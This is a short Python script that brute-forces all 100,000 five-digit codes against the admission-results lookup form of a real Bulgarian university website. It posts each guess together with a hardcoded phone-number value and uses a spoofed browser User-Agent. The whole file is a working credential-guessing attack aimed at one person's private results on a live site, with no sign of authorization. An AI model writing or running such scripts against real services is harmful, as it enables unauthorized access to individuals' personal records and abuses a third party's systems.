import requests
from itertools import product

# URL for the form submission
url = "https://www.uni-svishtov.bg/bg/admission/bachelor/bakalavar-obrazuvane-na-bala-za-uchastie-v-klasirane/proverka-na-rezultati"

# Headers to mimic a real browser request
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# Known value for the second field
second_field_value = "0444071407"


# Function to attempt login with the given code
def attempt_login(code):
    data = {
        'code_field_name': code,  # Replace 'code_field_name' with the actual name of the first input field
        'phone_field_name': second_field_value
        # Replace 'phone_field_name' with the actual name of the second input field
    }
    response = requests.post(url, headers=headers, data=data)

    # Check the response content to determine if the login was successful
    if "успех" in response.text:  # Replace 'успех' with an indicator of a successful login (e.g., a specific text in Bulgarian)
        return True, response.text
    return False, response.text


# Brute-force 5-digit codes
def brute_force_5_digit_code():
    for combination in product('0123456789', repeat=5):
        code = ''.join(combination)
        success, response_text = attempt_login(code)
        if success:
            print(f"Code found: {code}")
            return code, response_text
        print(f"Tried code: {code}")
    print("Code not found.")
    return None, None


# Start the brute-force process
code, response_text = brute_force_5_digit_code()

# If code is found, print the response text
if code:
    print(f"Successful code: {code}")
    print(f"Response: {response_text}")
